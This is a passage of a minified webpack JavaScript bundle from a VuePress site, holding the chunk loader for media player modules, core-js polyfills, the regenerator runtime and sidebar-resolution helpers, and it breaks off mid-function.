(window.webpackJsonp=window.webpackJsonp||[]).push([[1],[]]);!function(n){function e(e){for(var r,i,s=e[0],c=e[1],l=e[2],d=0,u=[];d<s.length;d++)i=s[d],Object.prototype.hasOwnProperty.call(o,i)&&o[i]&&u.push(o[i][0]),o[i]=0;for(r in c)Object.prototype.hasOwnProperty.call(c,r)&&(n[r]=c[r]);for(p&&p(e);u.length;)u.shift()();return a.push.apply(a,l||[]),t()}function t(){for(var n,e=0;e<a.length;e++){for(var t=a[e],r=!0,s=1;s<t.length;s++){var c=t[s];0!==o[c]&&(r=!1)}r&&(a.splice(e--,1),n=i(i.s=t[0]))}return n}var r={},o={2:0},a=[];function i(e){if(r[e])return r[e].exports;var t=r[e]={i:e,l:!1,exports:{}};return n[e].call(t.exports,t,t.exports,i),t.l=!0,t.exports}i.e=function(n){var e=[],t=o[n];if(0!==t)if(t)e.push(t[2]);else{var r=new Promise((function(e,r){t=o[n]=[e,r]}));e.push(t[2]=r);var a,s=document.createElement("script");s.charset="utf-8",s.timeout=120,i.nc&&s.setAttribute("nonce",i.nc),s.src=function(n){return i.p+"assets/js/"+({3:"vendors~aplayer",4:"vendors~artplayer",5:"vendors~dash",6:"vendors~dplayer",7:"vendors~hls",8:"vendors~mpegts",9:"vendors~shaka-player",10:"vendors~webtorrent"}[n]||n)+"."+{0:"e0c47f53",3:"e8507ad6",4:"66bb087d",5:"0bbb404d",6:"78936917",7:"1bdfaf9f",8:"97ee1f4b",9:"301276db",10:"5c2abfbd",11:"5871899e",12:"59cebc8c",13:"fb76bc65",14:"d388e61d",15:"1d88d902",16:"ddf7a44e",17:"942b54fb",18:"11ee4f6a",19:"66a5f6ac",20:"5e044943",21:"55619b28",22:"ab8f17e9",23:"9f828efe",24:"bb4a8fba",25:"5b028a91",26:"f150d730",27:"e7a93dfe",28:"4fd74838",29:"8e9fe76b",30:"85e4e595",31:"cbe5f658",32:"fe2eff5b",33:"dd288d9f",34:"66084c21",35:"7e8922ff",36:"511b9044",37:"c8c6a275",38:"29e6fe09",39:"6e03161c",40:"baeacd08",41:"69a01fc1",42:"f9c95a4a",43:"c67c8d33",44:"002db34f",45:"c2be514f",46:"b1618444",47:"ce9289b0",48:"aff489d3",49:"7dc32f85",50:"bbd24ec9",51:"89ee8f54",52:"7a27963e",53:"d6d8fc4a",54:"b703baf4",55:"ea78b93d",56:"7a3df03b",57:"ac9c58f0",58:"2c898e8c",59:"cccfb20b",60:"75cda1d3",61:"6d6fc575",62:"550d05ca",63:"1569740e",64:"27f5c4fd",65:"dff2981d",66:"61d41026",67:"deef71ea",68:"2a17d392",69:"b7872279",70:"d09fc501",71:"565f1b8a",72:"b14a4850",73:"c06a8164",74:"78d053f4"}[n]+".js"}(n);var c=new Error;a=function(e){s.onerror=s.onload=null,clearTimeout(l);var t=o[n];if(0!==t){if(t){var r=e&&("load"===e.type?"missing":e.type),a=e&&e.target&&e.target.src;c.message="Loading chunk "+n+" failed.\n("+r+": "+a+")",c.name="ChunkLoadError",c.type=r,c.request=a,t[1](c)}o[n]=void 0}};var l=setTimeout((function(){a({type:"timeout",target:s})}),12e4);s.onerror=s.onload=a,document.head.appendChild(s)}return Promise.all(e)},i.m=n,i.c=r,i.d=function(n,e,t){i.o(n,e)||Object.defineProperty(n,e,{enumerable:!0,get:t})},i.r=function(n){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(n,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(n,"__esModule",{value:!0})},i.t=function(n,e){if(1&e&&(n=i(n)),8&e)return n;if(4&e&&"object"==typeof n&&n&&n.__esModule)return n;var t=Object.create(null);if(i.r(t),Object.defineProperty(t,"default",{enumerable:!0,value:n}),2&e&&"string"!=typeof n)for(var r in n)i.d(t,r,function(e){return n[e]}.bind(null,r));return t},i.n=function(n){var e=n&&n.__esModule?function(){return n.default}:function(){return n};return i.d(e,"a",e),e},i.o=function(n,e){return Object.prototype.hasOwnProperty.call(n,e)},i.p="/",i.oe=function(n){throw console.error(n),n};var s=window.webpackJsonp=window.webpackJsonp||[],c=s.push.bind(s);s.push=e,s=s.slice();for(var l=0;l<s.length;l++)e(s[l]);var p=c;a.push([240,1]),t()}([function(n,e){var t=function(n){return n&&n.Math==Math&&n};n.exports=t("object"==typeof globalThis&&globalThis)||t("object"==typeof window&&window)||t("object"==typeof self&&self)||t("object"==typeof global&&global)||function(){return this}()||Function("return this")()},function(n,e,t){var r=t(68),o=Function.prototype,a=o.bind,i=o.call,s=r&&a.bind(i,i);n.exports=r?function(n){return n&&s(n)}:function(n){return n&&function(){return i.apply(n,arguments)}}},function(n,e,t){var r=t(0),o=t(39).f,a=t(32),i=t(15),s=t(118),c=t(125),l=t(93);n.exports=function(n,e){var t,p,d,u,m,f=n.target,g=n.global,b=n.stat;if(t=g?r:b?r[f]||s(f,{}):(r[f]||{}).prototype)for(p in e){if(u=e[p],d=n.noTargetGet?(m=o(t,p))&&m.value:t[p],!l(g?p:f+(b?".":"#")+p,n.forced)&&void 0!==d){if(typeof u==typeof d)continue;c(u,d)}(n.sham||d&&d.sham)&&a(u,"sham",!0),i(t,p,u,n)}}},function(n,e){n.exports=function(n){try{return!!n()}catch(n){return!0}}},function(n,e,t){"use strict";t.d(e,"a",(function(){return o}));t(5);function r(n,e,t,r,o,a,i){try{var s=n[a](i),c=s.value}catch(n){return void t(n)}s.done?e(c):Promise.resolve(c).then(r,o)}function o(n){return function(){var e=this,t=arguments;return new Promise((function(o,a){var i=n.apply(e,t);function s(n){r(i,o,a,s,c,"next",n)}function c(n){r(i,o,a,s,c,"throw",n)}s(void 0)}))}}},function(n,e,t){var r=t(128),o=t(15),a=t(256);r||o(Object.prototype,"toString",a,{unsafe:!0})},function(n,e,t){var r=t(0),o=t(84),a=t(12),i=t(85),s=t(119),c=t(159),l=o("wks"),p=r.Symbol,d=p&&p.for,u=c?p:p&&p.withoutSetter||i;n.exports=function(n){if(!a(l,n)||!s&&"string"!=typeof l[n]){var e="Symbol."+n;s&&a(p,n)?l[n]=p[n]:l[n]=c&&d?d(e):u(e)}return l[n]}},function(n,e){n.exports=function(n){return"function"==typeof n}},function(n,e,t){var r=t(3);n.exports=!r((function(){return 7!=Object.defineProperty({},1,{get:function(){return 7}})[1]}))},function(n,e,t){var r=t(0),o=t(10),a=r.String,i=r.TypeError;n.exports=function(n){if(o(n))return n;throw i(a(n)+" is not an object")}},function(n,e,t){var r=t(7);n.exports=function(n){return"object"==typeof n?null!==n:r(n)}},function(n,e,t){var r=t(0),o=t(82),a=r.String;n.exports=function(n){if("Symbol"===o(n))throw TypeError("Cannot convert a Symbol value to a string");return a(n)}},function(n,e,t){var r=t(1),o=t(21),a=r({}.hasOwnProperty);n.exports=Object.hasOwn||function(n,e){return a(o(n),e)}},function(n,e,t){var r=t(0),o=t(8),a=t(161),i=t(160),s=t(9),c=t(87),l=r.TypeError,p=Object.defineProperty,d=Object.getOwnPropertyDescriptor;e.f=o?i?function(n,e,t){if(s(n),e=c(e),s(t),"function"==typeof n&&"prototype"===e&&"value"in t&&"writable"in t&&!t.writable){var r=d(n,e);r&&r.writable&&(n[e]=t.value,t={configurable:"configurable"in t?t.configurable:r.configurable,enumerable:"enumerable"in t?t.enumerable:r.enumerable,writable:!1})}return p(n,e,t)}:p:function(n,e,t){if(s(n),e=c(e),s(t),a)try{return p(n,e,t)}catch(n){}if("get"in t||"set"in t)throw l("Accessors not supported");return"value"in t&&(n[e]=t.value),n}},function(n,e,t){var r=t(68),o=Function.prototype.call;n.exports=r?o.bind(o):function(){return o.apply(o,arguments)}},function(n,e,t){var r=t(0),o=t(7),a=t(12),i=t(32),s=t(118),c=t(92),l=t(35),p=t(81).CONFIGURABLE,d=l.get,u=l.enforce,m=String(String).split("String");(n.exports=function(n,e,t,c){var l,d=!!c&&!!c.unsafe,f=!!c&&!!c.enumerable,g=!!c&&!!c.noTargetGet,b=c&&void 0!==c.name?c.name:e;o(t)&&("Symbol("===String(b).slice(0,7)&&(b="["+String(b).replace(/^Symbol\(([^)]*)\)/,"$1")+"]"),(!a(t,"name")||p&&t.name!==b)&&i(t,"name",b),(l=u(t)).source||(l.source=m.join("string"==typeof b?b:""))),n!==r?(d?!g&&n[e]&&(f=!0):delete n[e],f?n[e]=t:i(n,e,t)):f?n[e]=t:s(e,t)})(Function.prototype,"toString",(function(){return o(this)&&d(this).source||c(this)}))},function(n,e,t){"use strict";var r=t(179).charAt,o=t(11),a=t(35),i=t(165),s=a.set,c=a.getterFor("String Iterator");i(String,"String",(function(n){s(this,{type:"String Iterator",string:o(n),index:0})}),(function(){var n,e=c(this),t=e.string,o=e.index;return o>=t.length?{value:void 0,done:!0}:(n=r(t,o),e.index+=n.length,{value:n,done:!1})}))},function(n,e,t){"use strict";t.d(e,"a",(function(){return r}));t(105);function r(n,e,t){return e in n?Object.defineProperty(n,e,{value:t,enumerable:!0,configurable:!0,writable:!0}):n[e]=t,n}},function(n,e,t){var r=t(0),o=t(180),a=t(181),i=t(152),s=t(32),c=t(6),l=c("iterator"),p=c("toStringTag"),d=i.values,u=function(n,e){if(n){if(n[l]!==d)try{s(n,l,d)}catch(e){n[l]=d}if(n[p]||s(n,p,e),o[e])for(var t in i)if(n[t]!==i[t])try{s(n,t,i[t])}catch(e){n[t]=i[t]}}};for(var m in o)u(r[m]&&r[m].prototype,m);u(a,"DOMTokenList")},function(n,e,t){var r=t(0).TypeError;n.exports=function(n){if(null==n)throw r("Can't call method on "+n);return n}},function(n,e,t){var r=function(n){"use strict";var e=Object.prototype,t=e.hasOwnProperty,r="function"==typeof Symbol?Symbol:{},o=r.iterator||"@@iterator",a=r.asyncIterator||"@@asyncIterator",i=r.toStringTag||"@@toStringTag";function s(n,e,t){return Object.defineProperty(n,e,{value:t,enumerable:!0,configurable:!0,writable:!0}),n[e]}try{s({},"")}catch(n){s=function(n,e,t){return n[e]=t}}function c(n,e,t,r){var o=e&&e.prototype instanceof d?e:d,a=Object.create(o.prototype),i=new j(r||[]);return a._invoke=function(n,e,t){var r="suspendedStart";return function(o,a){if("executing"===r)throw new Error("Generator is already running");if("completed"===r){if("throw"===o)throw a;return E()}for(t.method=o,t.arg=a;;){var i=t.delegate;if(i){var s=k(i,t);if(s){if(s===p)continue;return s}}if("next"===t.method)t.sent=t._sent=t.arg;else if("throw"===t.method){if("suspendedStart"===r)throw r="completed",t.arg;t.dispatchException(t.arg)}else"return"===t.method&&t.abrupt("return",t.arg);r="executing";var c=l(n,e,t);if("normal"===c.type){if(r=t.done?"completed":"suspendedYield",c.arg===p)continue;return{value:c.arg,done:t.done}}"throw"===c.type&&(r="completed",t.method="throw",t.arg=c.arg)}}}(n,t,i),a}function l(n,e,t){try{return{type:"normal",arg:n.call(e,t)}}catch(n){return{type:"throw",arg:n}}}n.wrap=c;var p={};function d(){}function u(){}function m(){}var f={};s(f,o,(function(){return this}));var g=Object.getPrototypeOf,b=g&&g(g(S([])));b&&b!==e&&t.call(b,o)&&(f=b);var h=m.prototype=d.prototype=Object.create(f);function v(n){["next","throw","return"].forEach((function(e){s(n,e,(function(n){return this._invoke(e,n)}))}))}function y(n,e){var r;this._invoke=function(o,a){function i(){return new e((function(r,i){!function r(o,a,i,s){var c=l(n[o],n,a);if("throw"!==c.type){var p=c.arg,d=p.value;return d&&"object"==typeof d&&t.call(d,"__await")?e.resolve(d.__await).then((function(n){r("next",n,i,s)}),(function(n){r("throw",n,i,s)})):e.resolve(d).then((function(n){p.value=n,i(p)}),(function(n){return r("throw",n,i,s)}))}s(c.arg)}(o,a,r,i)}))}return r=r?r.then(i,i):i()}}function k(n,e){var t=n.iterator[e.method];if(void 0===t){if(e.delegate=null,"throw"===e.method){if(n.iterator.return&&(e.method="return",e.arg=void 0,k(n,e),"throw"===e.method))return p;e.method="throw",e.arg=new TypeError("The iterator does not provide a 'throw' method")}return p}var r=l(t,n.iterator,e.arg);if("throw"===r.type)return e.method="throw",e.arg=r.arg,e.delegate=null,p;var o=r.arg;return o?o.done?(e[n.resultName]=o.value,e.next=n.nextLoc,"return"!==e.method&&(e.method="next",e.arg=void 0),e.delegate=null,p):o:(e.method="throw",e.arg=new TypeError("iterator result is not an object"),e.delegate=null,p)}function x(n){var e={tryLoc:n[0]};1 in n&&(e.catchLoc=n[1]),2 in n&&(e.finallyLoc=n[2],e.afterLoc=n[3]),this.tryEntries.push(e)}function w(n){var e=n.completion||{};e.type="normal",delete e.arg,n.completion=e}function j(n){this.tryEntries=[{tryLoc:"root"}],n.forEach(x,this),this.reset(!0)}function S(n){if(n){var e=n[o];if(e)return e.call(n);if("function"==typeof n.next)return n;if(!isNaN(n.length)){var r=-1,a=function e(){for(;++r<n.length;)if(t.call(n,r))return e.value=n[r],e.done=!1,e;return e.value=void 0,e.done=!0,e};return a.next=a}}return{next:E}}function E(){return{value:void 0,done:!0}}return u.prototype=m,s(h,"constructor",m),s(m,"constructor",u),u.displayName=s(m,i,"GeneratorFunction"),n.isGeneratorFunction=function(n){var e="function"==typeof n&&n.constructor;return!!e&&(e===u||"GeneratorFunction"===(e.displayName||e.name))},n.mark=function(n){return Object.setPrototypeOf?Object.setPrototypeOf(n,m):(n.__proto__=m,s(n,i,"GeneratorFunction")),n.prototype=Object.create(h),n},n.awrap=function(n){return{__await:n}},v(y.prototype),s(y.prototype,a,(function(){return this})),n.AsyncIterator=y,n.async=function(e,t,r,o,a){void 0===a&&(a=Promise);var i=new y(c(e,t,r,o),a);return n.isGeneratorFunction(t)?i:i.next().then((function(n){return n.done?n.value:i.next()}))},v(h),s(h,i,"Generator"),s(h,o,(function(){return this})),s(h,"toString",(function(){return"[object Generator]"})),n.keys=function(n){var e=[];for(var t in n)e.push(t);return e.reverse(),function t(){for(;e.length;){var r=e.pop();if(r in n)return t.value=r,t.done=!1,t}return t.done=!0,t}},n.values=S,j.prototype={constructor:j,reset:function(n){if(this.prev=0,this.next=0,this.sent=this._sent=void 0,this.done=!1,this.delegate=null,this.method="next",this.arg=void 0,this.tryEntries.forEach(w),!n)for(var e in this)"t"===e.charAt(0)&&t.call(this,e)&&!isNaN(+e.slice(1))&&(this[e]=void 0)},stop:function(){this.done=!0;var n=this.tryEntries[0].completion;if("throw"===n.type)throw n.arg;return this.rval},dispatchException:function(n){if(this.done)throw n;var e=this;function r(t,r){return i.type="throw",i.arg=n,e.next=t,r&&(e.method="next",e.arg=void 0),!!r}for(var o=this.tryEntries.length-1;o>=0;--o){var a=this.tryEntries[o],i=a.completion;if("root"===a.tryLoc)return r("end");if(a.tryLoc<=this.prev){var s=t.call(a,"catchLoc"),c=t.call(a,"finallyLoc");if(s&&c){if(this.prev<a.catchLoc)return r(a.catchLoc,!0);if(this.prev<a.finallyLoc)return r(a.finallyLoc)}else if(s){if(this.prev<a.catchLoc)return r(a.catchLoc,!0)}else{if(!c)throw new Error("try statement without catch or finally");if(this.prev<a.finallyLoc)return r(a.finallyLoc)}}}},abrupt:function(n,e){for(var r=this.tryEntries.length-1;r>=0;--r){var o=this.tryEntries[r];if(o.tryLoc<=this.prev&&t.call(o,"finallyLoc")&&this.prev<o.finallyLoc){var a=o;break}}a&&("break"===n||"continue"===n)&&a.tryLoc<=e&&e<=a.finallyLoc&&(a=null);var i=a?a.completion:{};return i.type=n,i.arg=e,a?(this.method="next",this.next=a.finallyLoc,p):this.complete(i)},complete:function(n,e){if("throw"===n.type)throw n.arg;return"break"===n.type||"continue"===n.type?this.next=n.arg:"return"===n.type?(this.rval=this.arg=n.arg,this.method="return",this.next="end"):"normal"===n.type&&e&&(this.next=e),p},finish:function(n){for(var e=this.tryEntries.length-1;e>=0;--e){var t=this.tryEntries[e];if(t.finallyLoc===n)return this.complete(t.completion,t.afterLoc),w(t),p}},catch:function(n){for(var e=this.tryEntries.length-1;e>=0;--e){var t=this.tryEntries[e];if(t.tryLoc===n){var r=t.completion;if("throw"===r.type){var o=r.arg;w(t)}return o}}throw new Error("illegal catch attempt")},delegateYield:function(n,e,t){return this.delegate={iterator:S(n),resultName:e,nextLoc:t},"next"===this.method&&(this.arg=void 0),p}},n}(n.exports);try{regeneratorRuntime=r}catch(n){"object"==typeof globalThis?globalThis.regeneratorRuntime=r:Function("r","regeneratorRuntime = r")(r)}},function(n,e,t){var r=t(0),o=t(19),a=r.Object;n.exports=function(n){return a(o(n))}},function(n,e,t){var r=t(0),o=t(7),a=function(n){return o(n)?n:void 0};n.exports=function(n,e){return arguments.length<2?a(r[n]):r[n]&&r[n][e]}},function(n,e,t){"use strict";t.d(e,"a",(function(){return a}));t(46),t(74),t(34),t(5),t(383),t(26),t(27),t(182),t(384),t(105);var r=t(17);function o(n,e){var t=Object.keys(n);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(n);e&&(r=r.filter((function(e){return Object.getOwnPropertyDescriptor(n,e).enumerable}))),t.push.apply(t,r)}return t}function a(n){for(var e=1;e<arguments.length;e++){var t=null!=arguments[e]?arguments[e]:{};e%2?o(Object(t),!0).forEach((function(e){Object(r.a)(n,e,t[e])})):Object.getOwnPropertyDescriptors?Object.defineProperties(n,Object.getOwnPropertyDescriptors(t)):o(Object(t)).forEach((function(e){Object.defineProperty(n,e,Object.getOwnPropertyDescriptor(t,e))}))}return n}},function(n,e,t){"use strict";var r=this&&this.__assign||function(){return(r=Object.assign||function(n){for(var e,t=1,r=arguments.length;t<r;t++)for(var o in e=arguments[t])Object.prototype.hasOwnProperty.call(e,o)&&(n[o]=e[o]);return n}).apply(this,arguments)},o=this&&this.__read||function(n,e){var t="function"==typeof Symbol&&n[Symbol.iterator];if(!t)return n;var r,o,a=t.call(n),i=[];try{for(;(void 0===e||e-- >0)&&!(r=a.next()).done;)i.push(r.value)}catch(n){o={error:n}}finally{try{r&&!r.done&&(t=a.return)&&t.call(a)}finally{if(o)throw o.error}}return i},a=this&&this.__spreadArray||function(n,e,t){if(t||2===arguments.length)for(var r,o=0,a=e.length;o<a;o++)!r&&o in e||(r||(r=Array.prototype.slice.call(e,0,o)),r[o]=e[o]);return n.concat(r||Array.prototype.slice.call(e))};Object.defineProperty(e,"__esModule",{value:!0});var i=function(n){if("object"==typeof n&&null!==n){if("function"==typeof Object.getPrototypeOf){var e=Object.getPrototypeOf(n);return e===Object.prototype||null===e}return"[object Object]"===Object.prototype.toString.call(n)}return!1},s=function(){for(var n=[],e=0;e<arguments.length;e++)n[e]=arguments[e];return n.reduce((function(n,e){return Object.keys(e).forEach((function(t){Array.isArray(n[t])&&Array.isArray(e[t])?n[t]=s.options.mergeArrays?Array.from(new Set(n[t].concat(e[t]))):e[t]:i(n[t])&&i(e[t])?n[t]=s(n[t],e[t]):n[t]=e[t]})),n}),{})},c={mergeArrays:!0};s.options=c,s.withOptions=function(n){for(var e=[],t=1;t<arguments.length;t++)e[t-1]=arguments[t];s.options=r({mergeArrays:!0},n);var i=s.apply(void 0,a([],o(e),!1));return s.options=c,i},e.default=s},function(n,e,t){var r=t(67),o=t(19);n.exports=function(n){return r(o(n))}},function(n,e,t){"use strict";var r=t(2),o=t(184);r({target:"Array",proto:!0,forced:[].forEach!=o},{forEach:o})},function(n,e,t){var r=t(0),o=t(180),a=t(181),i=t(184),s=t(32),c=function(n){if(n&&n.forEach!==i)try{s(n,"forEach",i)}catch(e){n.forEach=i}};for(var l in o)o[l]&&c(r[l]&&r[l].prototype);c(a)},function(n,e,t){"use strict";var r=t(2),o=t(98);r({target:"RegExp",proto:!0,forced:/./.exec!==o},{exec:o})},function(n,e){n.exports=!1},function(n,e,t){var r=t(15),o=t(272),a=Error.prototype;a.toString!==o&&r(a,"toString",o)},function(n,e,t){var r=t(1),o=r({}.toString),a=r("".slice);n.exports=function(n){return a(o(n),8,-1)}},function(n,e,t){var r=t(8),o=t(13),a=t(56);n.exports=r?function(n,e,t){return o.f(n,e,a(1,t))}:function(n,e,t){return n[e]=t,n}},function(n,e,t){var r=t(47);n.exports=function(n){return r(n.length)}},function(n,e,t){"use strict";var r=t(2),o=t(57).filter;r({target:"Array",proto:!0,forced:!t(96)("filter")},{filter:function(n){return o(this,n,arguments.length>1?arguments[1]:void 0)}})},function(n,e,t){var r,o,a,i=t(242),s=t(0),c=t(1),l=t(10),p=t(32),d=t(12),u=t(117),m=t(91),f=t(69),g=s.TypeError,b=s.WeakMap;if(i||u.state){var h=u.state||(u.state=new b),v=c(h.get),y=c(h.has),k=c(h.set);r=function(n,e){if(y(h,n))throw new g("Object already initialized");return e.facade=n,k(h,n,e),e},o=function(n){return v(h,n)||{}},a=function(n){return y(h,n)}}else{var x=m("state");f[x]=!0,r=function(n,e){if(d(n,x))throw new g("Object already initialized");return e.facade=n,p(n,x,e),e},o=function(n){return d(n,x)?n[x]:{}},a=function(n){return d(n,x)}}n.exports={set:r,get:o,has:a,enforce:function(n){return a(n)?o(n):r(n,{})},getterFor:function(n){return function(e){var t;if(!l(e)||(t=o(e)).type!==n)throw g("Incompatible receiver, "+n+" required");return t}}}},function(n,e){var t=Array.isArray;n.exports=t},function(n,e,t){var r=t(22);n.exports=r("navigator","userAgent")||""},function(n,e,t){var r=t(1);n.exports=r({}.isPrototypeOf)},function(n,e,t){var r=t(8),o=t(14),a=t(124),i=t(56),s=t(25),c=t(87),l=t(12),p=t(161),d=Object.getOwnPropertyDescriptor;e.f=r?d:function(n,e){if(n=s(n),e=c(e),p)try{return d(n,e)}catch(n){}if(l(n,e))return i(!o(a.f,n,e),n[e])}},function(n,e,t){var r=t(194),o="object"==typeof self&&self&&self.Object===Object&&self,a=r||o||Function("return this")();n.exports=a},function(n,e,t){"use strict";function r(n,e,t,r,o,a,i,s){var c,l="function"==typeof n?n.options:n;if(e&&(l.render=e,l.staticRenderFns=t,l._compiled=!0),r&&(l.functional=!0),a&&(l._scopeId="data-v-"+a),i?(c=function(n){(n=n||this.$vnode&&this.$vnode.ssrContext||this.parent&&this.parent.$vnode&&this.parent.$vnode.ssrContext)||"undefined"==typeof __VUE_SSR_CONTEXT__||(n=__VUE_SSR_CONTEXT__),o&&o.call(this,n),n&&n._registeredComponents&&n._registeredComponents.add(i)},l._ssrRegister=c):o&&(c=s?function(){o.call(this,(l.functional?this.parent:this).$root.$options.shadowRoot)}:o),c)if(l.functional){l._injectStyles=c;var p=l.render;l.render=function(n,e){return c.call(e),p(n,e)}}else{var d=l.beforeCreate;l.beforeCreate=d?[].concat(d,c):[c]}return{exports:n,options:l}}t.d(e,"a",(function(){return r}))},function(n,e,t){var r,o=t(9),a=t(120),i=t(123),s=t(69),c=t(164),l=t(86),p=t(91),d=p("IE_PROTO"),u=function(){},m=function(n){return"<script>"+n+"<\/script>"},f=function(n){n.write(m("")),n.close();var e=n.parentWindow.Object;return n=null,e},g=function(){try{r=new ActiveXObject("htmlfile")}catch(n){}var n,e;g="undefined"!=typeof document?document.domain&&r?f(r):((e=l("iframe")).style.display="none",c.appendChild(e),e.src=String("javascript:"),(n=e.contentWindow.document).open(),n.write(m("document.F=Object")),n.close(),n.F):f(r);for(var t=i.length;t--;)delete g.prototype[i[t]];return g()};s[d]=!0,n.exports=Object.create||function(n,e){var t;return null!==n?(u.prototype=o(n),t=new u,u.prototype=null,t[d]=n):t=g(),void 0===e?t:a.f(t,e)}},function(n,e,t){var r=t(68),o=Function.prototype,a=o.apply,i=o.call;n.exports="object"==typeof Reflect&&Reflect.apply||(r?i.bind(a):function(){return i.apply(a,arguments)})},function(n,e,t){var r=t(0),o=t(7),a=t(89),i=r.TypeError;n.exports=function(n){if(o(n))return n;throw i(a(n)+" is not a function")}},function(n,e,t){"use strict";var r=t(2),o=t(57).map;r({target:"Array",proto:!0,forced:!t(96)("map")},{map:function(n){return o(this,n,arguments.length>1?arguments[1]:void 0)}})},function(n,e,t){var r=t(2),o=t(21),a=t(90);r({target:"Object",stat:!0,forced:t(3)((function(){a(1)}))},{keys:function(n){return a(o(n))}})},function(n,e,t){var r=t(62),o=Math.min;n.exports=function(n){return n>0?o(r(n),9007199254740991):0}},function(n,e,t){var r=t(2),o=t(0),a=t(43),i=t(268),s=o.WebAssembly,c=7!==Error("e",{cause:7}).cause,l=function(n,e){var t={};t[n]=i(n,e,c),r({global:!0,forced:c},t)},p=function(n,e){if(s&&s[n]){var t={};t[n]=i("WebAssembly."+n,e,c),r({target:"WebAssembly",stat:!0,forced:c},t)}};l("Error",(function(n){return function(e){return a(n,this,arguments)}})),l("EvalError",(function(n){return function(e){return a(n,this,arguments)}})),l("RangeError",(function(n){return function(e){return a(n,this,arguments)}})),l("ReferenceError",(function(n){return function(e){return a(n,this,arguments)}})),l("SyntaxError",(function(n){return function(e){return a(n,this,arguments)}})),l("TypeError",(function(n){return function(e){return a(n,this,arguments)}})),l("URIError",(function(n){return function(e){return a(n,this,arguments)}})),p("CompileError",(function(n){return function(e){return a(n,this,arguments)}})),p("LinkError",(function(n){return function(e){return a(n,this,arguments)}})),p("RuntimeError",(function(n){return function(e){return a(n,this,arguments)}}))},function(n,e,t){var r=t(293),o=t(296);n.exports=function(n,e){var t=o(n,e);return r(t)?t:void 0}},function(n,e,t){"use strict";t.d(e,"a",(function(){return o}));t(83);t(74),t(97),t(5),t(134),t(16),t(18);var r=t(108);t(48),t(30);function o(n,e){return function(n){if(Array.isArray(n))return n}(n)||function(n,e){var t=null==n?null:"undefined"!=typeof Symbol&&n[Symbol.iterator]||n["@@iterator"];if(null!=t){var r,o,a=[],i=!0,s=!1;try{for(t=t.call(n);!(i=(r=t.next()).done)&&(a.push(r.value),!e||a.length!==e);i=!0);}catch(n){s=!0,o=n}finally{try{i||null==t.return||t.return()}finally{if(s)throw o}}return a}}(n,e)||Object(r.a)(n,e)||function(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}},function(n,e,t){"use strict";var r=t(2),o=t(0),a=t(3),i=t(65),s=t(10),c=t(21),l=t(33),p=t(73),d=t(155),u=t(96),m=t(6),f=t(60),g=m("isConcatSpreadable"),b=o.TypeError,h=f>=51||!a((function(){var n=[];return n[g]=!1,n.concat()[0]!==n})),v=u("concat"),y=function(n){if(!s(n))return!1;var e=n[g];return void 0!==e?!!e:i(n)};r({target:"Array",proto:!0,forced:!h||!v},{concat:function(n){var e,t,r,o,a,i=c(this),s=d(i,0),u=0;for(e=-1,r=arguments.length;e<r;e++)if(y(a=-1===e?i:arguments[e])){if(u+(o=l(a))>9007199254740991)throw b("Maximum allowed index exceeded");for(t=0;t<o;t++,u++)t in a&&p(s,u,a[t])}else{if(u>=9007199254740991)throw b("Maximum allowed index exceeded");p(s,u++,a)}return s.length=u,s}})},function(n,e,t){"use strict";t.d(e,"e",(function(){return r})),t.d(e,"b",(function(){return a})),t.d(e,"j",(function(){return i})),t.d(e,"g",(function(){return c})),t.d(e,"h",(function(){return l})),t.d(e,"i",(function(){return p})),t.d(e,"c",(function(){return d})),t.d(e,"f",(function(){return u})),t.d(e,"l",(function(){return m})),t.d(e,"m",(function(){return f})),t.d(e,"d",(function(){return b})),t.d(e,"k",(function(){return h})),t.d(e,"n",(function(){return v})),t.d(e,"a",(function(){return k}));t(28),t(53),t(226),t(80),t(225),t(156),t(45),t(26),t(5),t(27),t(34),t(83),t(148),t(116),t(51),t(213),t(30),t(111);var r=/#.*$/,o=/\.(md|html)$/,a=/\/$/,i=/^[a-z]+:/i;function s(n){return decodeURI(n).replace(r,"").replace(o,"")}function c(n){return i.test(n)}function l(n){return/^mailto:/.test(n)}function p(n){return/^tel:/.test(n)}function d(n){if(c(n))return n;if(!n)return"404";var e=n.match(r),t=e?e[0]:"",o=s(n);return a.test(o)?n:o+".html"+t}function u(n,e){var t=n.hash,o=function(n){var e=n&&n.match(r);if(e)return e[0]}(e);return(!o||t===o)&&s(n.path)===s(e)}function m(n,e,t){if(c(e))return{type:"external",path:e};t&&(e=function(n,e,t){var r=n.charAt(0);if("/"===r)return n;if("?"===r||"#"===r)return e+n;var o=e.split("/");t&&o[o.length-1]||o.pop();for(var a=n.replace(/^\//,"").split("/"),i=0;i<a.length;i++){var s=a[i];".."===s?o.pop():"."!==s&&o.push(s)}""!==o[0]&&o.unshift("");return o.join("/")}(e,t));for(var r=s(e),o=0;o<n.length;o++)if(s(n[o].regularPath)===r)return Object.assign({},n[o],{type:"page",path:d(n[o].path)});return console.error('[vuepress] No matching page found for sidebar item "'.concat(e,'"')),{}}function f(n,e,t,r){var o=t.pages,a=t.themeConfig,i=r&&a.locales&&a.locales[r]||a;if("auto"===(n.frontmatter.sidebar||i.sidebar||a.sidebar))return g(n);var s=i.sidebar||a.sidebar;if(s){var c=function(n,e){if(Array.isArray(e))return{base:"/",config:e};for(var t in e)if(0===(r=n,/(\.html|\/)$/.test(r)?r:r+"/").indexOf(encodeURI(t)))return{base:t,config:e[t]};var r;return{}}(e,s),l=c.base,p=c.config;return"auto"===p?g(n):p?p.map((function(n){return function n(e,t,r){var o=arguments.length>3&&void 0!==arguments[3]?arguments[3]:1;if("string"==typeof e)return m(t,e,r);if(Array.isArray(e))return Object.assign(m(t,e[0],r),{title:e[1]});o>3&&console.error("[vuepress] detected a too deep nested sidebar group.");var a=e.children||[];return 0===a.length&&e.path?Object.assign(m(t,e.path,r),{title:e.title}):{type:"group",path:e.path,title:e.title,sidebarDepth:e.sidebarDepth,initialOpenGroupIndex:e.initialOpenGroupIndex,children:a.map((function(e){return n(e,t,r,o+1)})),collapsable:!1!==e.collapsable}}(n,o,l)})):[]}return[]}function g(n){var e=b(n.headers||[]);return[{type:"group",collapsable:!1,title:n.title,path:null,children:e.map((function(e){return{type:"auto",title:e.title,basePath:n.path,path:n.path+"#"+e.slug,children:e.children||[]}}))}]}function b(n){var e;return(n=n.map((function(n){return 